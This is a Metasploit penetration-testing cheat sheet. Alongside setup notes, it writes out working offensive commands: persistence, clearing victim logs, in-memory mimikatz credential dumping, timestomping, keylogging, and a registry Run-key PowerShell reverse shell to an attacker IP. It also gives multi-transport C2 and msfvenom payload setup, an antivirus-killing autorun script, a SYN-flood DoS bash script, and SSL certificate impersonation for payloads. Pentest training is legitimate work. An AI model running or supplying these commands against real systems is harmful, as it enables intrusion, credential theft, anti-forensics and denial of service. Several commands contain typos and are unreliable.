# Metasploit

![](<../.gitbook/assets/image (282) (1) (1) (1) (1) (1) (1).png>)

{% embed url="https://www.sans.org/blog/sans-pen-test-cheat-sheet-metasploit" %}

## Database

#### create a new db for a project with postgresql.

```
# systemctl start postgresql
# su postgres
$ createuser --interactive msf_user -P

    Enter password for new role: 
    Enter it again: 
    Shall the new role be a superuser? (y/n) n
    Shall the new role be allowed to create databases? (y/n) n
    Shall the new role be allowed to create more new roles? (y/n) n

$ createdb --owner=msf_user msf_database
$ exit
```

{% hint style="info" %}
#### initiate the database before starting msfconsole
{% endhint %}

```
msf> db_connect msf_user:[PASSWORD]@127.0.0.1:5432/msf_database
msf> workspace -a [metasploitable2]
```

## Searchsploit

Sometimes Metasploit and ExploitDB  don't share the same database, its also possible that you find some exploits that are not ported to metasploit modules. so its a good practice to search for exploits in both of theme.

### Easy Searchsploit

search for exploits from nmap XML output.

```
searchsploit --nmap *.xml 
```

### Exclude Something

```
searchsploit <search string> | grep -v '/dos/'
```

### Search Only in Exploit Title

```
searchsploit -t <search string> --colour
```

## Metasploit Modules

#### located in `/usr/share/metasploit-framework/modules/`

### exploits&#x20;

modules that use payloads&#x20;

located in /usr/share/metasploit-framework/modules/exploits/

### auxiliary

&#x20;include port scanners, fuzzers, sniffers, and more

&#x20;located in `/usr/share/metasploit-framework/modules/auxiliary`



### Payloads, Encoders, Nopes&#x20;

payloads are codes that run remotely&#x20;

located in `/usr/share/metasploit-framework/modules/payloads`

encoders ensure that payloads make it to their destination intact

located in `/usr/share/metasploit-framework/modules/encoders`

&#x20;Nopes keep the payload sizes consistant across exploit attempts

&#x20; located in `/usr/share/metasploit-framework/modules/nops`



## Loading Additional Module Trees

we can add additional modules either at runtime or after msf starts. -m will tell msf to load additional modules at runtime:

```
msfconsole -m  ~/new-modules/
```

for adding after msf start:

```
msf> loadpath /path/to/modules
```

## General Commands

move out of module

&#x20;`back`

display random banner

&#x20;`banner`

check an exploit before running it (not for all)&#x20;

`check`

disable/enable console color (for old and dummy terminals)

`color -h`

remote connect to a machine&#x20;

`connect -h`

edit the loaded module

&#x20;`edit`

search for modules&#x20;

`search -h (grep enabled)`

info about a module

&#x20;`info [module]`

live ruby interpreter shell&#x20;

`irb`

manage jobs

&#x20;`jobs -h`

kill a module or job&#x20;

`kill [num]`

load/unload a plugin&#x20;

`load/unload [plugin]`&#x20;

load a third party module

&#x20;`loadpath [path/to/module]`

run resource(batch) files

&#x20;`resource [file] u`

{% hint style="info" %}
#### sefull in karmetasploit attacks and alone batch files can speedup a test by automating tasks
{% endhint %}

route sockets through a session or command

&#x20;`route -h`

show/select active sessions&#x20;

`sessions -l`&#x20;

`sessions [num]`

set/unset options&#x20;

`set`&#x20;

`unset`

set/unset global variables

&#x20;`setg [name] [value]`&#x20;

`unsetg`

save state

`save`

show available options/modules&#x20;

`show options`&#x20;

`show targets`&#x20;

`show adanced`

&#x20;`show payloads`&#x20;

`show exploits`

`show auxiliary`&#x20;

`show encoders`

&#x20;`show nops`

&#x20;`show evation`

run and send an exploit to background&#x20;

`exploit -j`

## Types of Exploits

### Active Exploits

* #### will exploit a specific host, run until complition and then exit.
* #### bruteforce modules
* #### stop on errors
* #### can be forces to background with -j

### Passive Exploit

* wait for incomming host connections and exploit them as they connect
* almost always focus on clients such as web browsers, FTP clients, etc.
* can be used in conjunction with email exploits&#x20;
* waiting for connections&#x20;
* report shells as they happen
* can be enumerated by passing -i to the sessions command.

## Types of Payloads

Single, Stager, Stages

### singles&#x20;

* standalone and self-contained&#x20;
* can be caught with non-metasploit handlers such as netcat
* &#x20;sent and executed in a single part at one time

### stagers&#x20;

* the payload comes in 2 parts, the first and the second stage
* the first stage is small and is purpose is to download and run the second stage
* the second stage is the main part of the payload with the important functionalities
* designed to be used when size matters, small and reliable&#x20;
* usually more stable than a large single payload.

### inline (non-staged)

* a single payload&#x20;
* containing the exploit and shellcode&#x20;
* more stable than staged

### meterpreter&#x20;

* short for meta-interpreter&#x20;
* advanced multi-function payload that operates via dll injection
* &#x20;resides completely on the memory of victim machine (doesn't touch the disk at all)&#x20;
* very difficult to detect&#x20;
* scripts and modules can be loaded and unloaded

### Passivex

* can help in circumventing restrictive outbound firewalls
* &#x20;uses an activeX control to create a hidden instance of internet explorer and communicates with the attacker over HTTP protocol

### Nonx

* NX (no execute) bit is a feature built into some CPUs to prevent code from executing in certain areas of memory&#x20;
* in windows NX is implemented as data execution prevention (DEP)&#x20;
* nonx payloads circumvent DEP

### ORD

* windows stager based payloads
* it works on every flavor and language of windows dating back to windows 9x without the explicit definition of a return address
* &#x20;extremely tiny it relies on the fact that ws2\_32.dll is loaded in the process being exploited before exploited.&#x20;
* a bit less stable than other stagers

{% hint style="info" %}
#### reflective DLL injection : a technique wherby a stage payload is injected into a compromised host process running in memory.never touching the memory VNC and meterpreter use it.
{% endhint %}

## Integration with nmap

```
# run nmap with db_nmap command
# all results will be saved in your database
msf5 > db_nmap

# example:
db_nmap -sV -p- -A -T4 --version-intensity 9 -Pn -n 192.168.56.102
```

## Integration with Nessus

install  and run nessus:

```
systemstcl start nessusd.service
```

load nessus in msfconsole:

```
msf5> load nessus
msf5> nessus_help
```

connect to nessus host (can be remote):

```
nessus_connect NessusUser:NessusPassword@127.0.0.1 ok
```

nessus commands:

```
nessus_policy_list  >>> list all policies

nessus_scan_new [uuid of policy]  >>> start new scan

nessus_scan_list >>> show list of current running scans

nessus_scan_details [num] >>> check an scan status

nessus_db_import [num] >>> import scan results to msf
```

after importing results to msf we can use msf DB commands to search for vulns and services:

```
hosts
services
```

## Integration with OpenVAS

install and run openvas:

```
gvm-start
load opencas
openvas_help
help openvas
```

connect to host:

```
openvas_connect admin 1983 127.0.0.1 9390 ok  
```

openvas commands:

```
openvas_config_list >>> copy the config id you want

openvas_target_create metasploitable 192.168.56.102 metasploitable  >>> create a target for a new task

 openvas_task_create metasploitabe2 "metasploitable2" [config id] [target id]  >>> create a task
 
 openvas_task_list >>> show  tasks
 
 openvas_task_start [id] >>> start task
```

## Pivoting & Forwarding

#### see [Metasploit pivoting ](../network-attacks/pivoting/metasploit-pivoting.md#proxy)section.

## Route Traffic over Tor

```
apt install tor
```

edit tor config `/etc/tor/torrc` uncomment following lines:

```
HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 10.17.0.5:9999
```

change the hiddenserviceport ip address from 127.0.0.1 to your private ip and local port 80 to 9999

```
service tor start 
or
tor
```

find your tor hidden service hostname

```
cat /var/lib/tor/hidden_service/hostname
```

![](<../.gitbook/assets/image (289) (1).png>)

create a payload with msfvenom and set the `lhost` to the union address and append .link to it:

![](<../.gitbook/assets/image (272) (1) (1).png>)

in listener set lhost to your local ip address:

![](<../.gitbook/assets/image (275) (1) (1) (1).png>)

run the attack:

![](<../.gitbook/assets/image (291) (1) (1).png>)

using tor is extremely slow ad your session may timeout, play around with timeout values.

## Logging&#x20;

every command will be logged in a file named console.log in `~/.msf4/logs`

```
se consolelogging true
```

## Auto Persistence

```
run persistence –A –L [directory to put payload] -X [connection attempt intervals/sec]  –p [attacker port] –r [attaacker ip]
```

```
-A for auro starting listener
-X for starting at reboot
 
# for help:
run persistance -h 
#erun persistence –A –L c:\\ -X 30 –p 443 –r 192.168.1.113
```

## Clear Victim System Logs&#x20;

(system, security & application logs)

```
clearev
```

## Execute Commands Directly From Memory

#### The executable file can be on attacker side since meterpreter is running completely in memory, we can execute remote binaries directly in memory.

```
execute -h
```

example:

#### execute mimikatz directly from memory(binary is on attacker side):

```
migrate -N lsass.exe
execute -H -i -c -m -d calc.exe -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
```

#### adding command parameters( -a)

```
execute -H -i -c -m -d calc.exe -f /usr/share/windows-resources/mimikatz/x64/mimikatz.exe -a '"sekurlsa::logonpasswords" exit'
```

## Multiple Connection Channels

example:

open notepad app in a different channel

```
execute -f notepad.exe -c
```

list channels

```
channel -l 
```

read/write data to a channel

```
write [option] [channel id]
read
```

## Change File Timestamp

modify the date and time of file and folder modification and access

```
timestomp -h

# list the value of MACE (modified-accessed-created-entry)
timestomp /path/to/file -v 

# change the creation time
 timestomp /path/to/file -c  "05/25/2020 01:01:01"
 
 #  change last access time
  timestomp /path/to/file -a  "05/25/2020 01:01:01" 
  
 # change the last modify time
  timestomp /path/to/file -m  "05/25/2020 01:01:01"
```

## Process Migration

```
migrate -h
 migrate [pid]
 migrate -N [process name]
```

## Keylogger

#### migrate to explorer.exe (for better performance)

```
keyscan_start
keyscan_dump
keyscan_stop
```

## Dig Info and Enumeration

net info, pass hashes, registry, etc.

```
run scraper   
run winenum
```

## Interact with the Registry

```
reg -h
```

example:

#### set a registry to run powershell reverse shell whenever the user logs in:

```
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v -Power -d "powershell -ep bypass -c $client = New-Object System.Net.Sockets.TCPClient('192.168.56.1',9999);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

## Timeout Control

```
get_timeouts

#  set communication timeout to 900 secs
set_timeouts -c 900
```

## Sleep Control

makes current meterpreter session go to sleep for specific period of time and wake up again.

```
sleep
sleep 10 # sleep for 10 secs
```

## Transports

Once Meterpreter shellcode has been run; whether from a phish, or some other means, it will reach out to the attacker’s Command and Control (C2) server over some network transport, such as HTTP, HTTPS or TCP. However, in an unknown environment, a successful connection is not guaranteed: firewalls, proxies, or intrusion prevention systems might all prevent a certain transport method from reaching out to the public Internet.Repeated trial and error is sometimes possible, but not always. For a phish, clicks come at a premium. Some exploits only give you one shot to get a shell, before crashing the host process.Meterpreter has the ability to have multiple “transports” in a single implant. A transport is the method by which it communicates to the Metasploit C2 server: TCP, HTTP, etc. Typically, Meterpreter is deployed with a single transport, having had the payload type set in msfvenom or in a Metasploit exploit module (e.g. meterpreter\_reverse\_http).

#### But after a connection has been made between the implant and the C2 server, an operator can add additional, backup transports. This is particularly useful for redundancy: if one path goes down (e.g. your domain becomes blacklisted), it can fall back to another.

#### A transport is defined by its properties:

* **The type of transport (TCP, HTTP, etc.)**&#x20;
* **The host to connect to**&#x20;
* **The port to connect on**
* &#x20;**A URI, for HTTP-based transports**
* &#x20;**Other properties such as retry times and timeouts**

Once a Meterpreter session has been set up, you can add a transport using the command transport add and providing it with parameters (type transport to see the options).

By setting up multiple transports in this initialisation script, Meterpreter will try each of them (for a configurable amount of time), before moving on to the next one.

#### To do this:

Create a stageless meterpreter payload, which pre-loads the PowerShell extension. The transport used on the command line will be the default Include a PowerShell script as an “Extension Initialisation Script” (parameter name is extinit, and has the format of ,). This script should add additional transports to the Meterpreter session. When the shellcode runs, this script will also run If the initial transport (the one specified on the command line) fails, Meterpreter will then try each of these alternative transports in turn.

in AddTransports.ps1 :

```
Add-TcpTransport -lhost <host> -lport <port> -RetryWait 10 -RetryTotal 30
Add-WebTransport -Url https://<host>:<port>;-RetryWait 10 -RetryTotal 30
Add-WebTransport -Url http://<host>:<port>;-RetryWait 10 -RetryTotal 30
```

#### The command line for this would be:

```
msfvenom -p windows/meterpreter_reverse_tcp lhost=<host> lport=<port> sessionretrytotal=30 sessionretrywait=10 extensions=stdapi,priv,powershell extinit=powershell,/home/ionize/AddTransports.ps1 -f exe
```

#### Some got chas to be aware of:

* Make sure you include the full path to the extinit parameter (relative paths don’t appear to work)
* &#x20;Ensure you configure how long to try each transport before moving on to the next.
* &#x20;RetryWait is the time to wait between each attempt to contact the C2 server
* &#x20;RetryTotal is the total amount of time to wait before moving on to the next transport&#x20;
* Note that the parameter names for retry times and timeouts are different between the PowerShell bindings and the Metasploit parameters themselves:
  * &#x20;in the PowerShell extension, they are RetryWait and RetryTotal; in Metasploit they are SessionRetryWait and SessionRetryTotal (a tad confusing, as they relate to transports, not sessions)

### Manually Creating Transport in Meterpreter Session

```
transport add -t [transport type, i.e: reverse_https] -l [lhost] -p [lport] -T [retry total time] -W [retry wait] -C [comm timeout] 
transport add -l 192.168.56.1 -p 7878 -t reverse_https -T 3000 -W 10 -C 1000000
```

#### to move to another transport background the current session and run the right payload with options same as the target transport and wait for connection.

#### once you have more than one transfport its safe to use this command to move between transports:

```
transport next
transport prev
```

## Enable RDP

enable RDP on victim machine use rdesktop to connect

```
run getgui -e
```

## Script Automation

#### put the meterpreter commands in a .rc file setup meter and set the autorun script path:.

example:

#### migrate o explorer.exe and dump system credential

```
set AutoRunScript  /root/autoruncommands.rc

migrate -N explorer.exe
getsystem
run post/windows/manage/killav
run post/windows/gather/checkvm
getuid
```

we can automate the whole thing too.

For example, using a standard editor, we will create a script in our home directory named setup.rc. In this script, we will set the payload to windows/meterpreter/reverse\_https and configure the relevant LHOST and LPORT parameters. We also enable stage encoding using the x86/shikata\_ga\_nai encoder and configure the post/windows/manage/migrate module to be executed automatically using the AutoRunScript option. This will cause the spawned meterpreter to automatically launch a background notepad.exe process and migrate to it. Finally, the ExitOnSession parameter is set to “false” to ensure that the listener keeps accepting new connections and the module is executed with the -j and -z flags to stop us from automatically interacting with the session. The commands for this are as follows:

```
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST 10.11.0.4
set LPORT 443
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai
set AutoRunScript post/windows/manage/migrate
set ExitOnSession false
exploit -j -z
```

```
sudo msfconsole -r setup.rc
```

With the listener configured and running, we can, for example, launch an executable containing a meterpreter payload from our Windows VM. We can create this executable with msfvenom :

```
msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.4 LPORT=443 -f exe -o met.exe
```

When executed, our multi/handler accepts the connection

we can specify scripts manually after getting a session:

```
meterrpreter> resource script.rc
```

## Bash Automation

we can write bash scripts to automate the tasks: example: a dos attack.

```
 #!/bin/bash
 TARGET
 echo " Choose who to DDoS (IP address ONLY), use nslookup < URL> to get IP address"
 read TARGET
 msfconsole -q -x "use auxiliary/dos/tcp/synflood;set RHOST $TARGET; exploit;
```

## Payloads with Trusted SSL Certificates

configure a domain in `zinitiative.com` and use lets enrypt to get a certificate after configuring the domain DNS servers to point to the `digitalocean` droplet getting a certificate with lets encrypt is very simple.

first install letsencrypt:

```
apt install lets encrypt -y
```

generate a cert

```
letsencrypt cartonly --manual -d zinitiative.com
```

we should have a cert under `/etc/letsencrypt/live/zinitiative.co`m directroy

before we can move on we will have to creare a unified file containng privkey.pem and cert.pem:

```
cd /etc/letsencrypt/live/zinitiative.com 
cat privkey.pem cert.pem >> /root/unified.pem
```

now in msfconsole set the cert

```
set lhost zinitiative.com
set lport 443
set handlersslcert /root/unified.pem
set stagetverifysslcert true
set enablestageencoding true
run
```

## Using Payloads with HTTP SSL

```
use auxiliary/gather/impersonate_ssl

# we use symantec websit as an example:
set rhost www.symantec.om
run
```

![](<../.gitbook/assets/image (296) (1) (1) (1) (1) (1).png>)

we have the cert now create a payload using the cert:

```
msfvenom -p windows/meterpreter/reverse_tcp lhosrt=1.2.3.4 lport=1234 handlersslcert=/root/.msf5/loot/fsdvd/cert.pem stagerverifysslcert=true -f exe -o payload.exemsfvenom -p windows/meterpreter/reverse_tcp lhosrt=1.2.3.4 lport=1234 handlersslcert=/root/.msf5/loot/fsdvd/cert.pem stagerverifysslcert=true -f exe -o payload.exe
```

in handler setting:

```
set handlersslcert [file.pem]
set stagerverifysslcert true
run
```

![](<../.gitbook/assets/image (276) (1) (1) (1).png>)
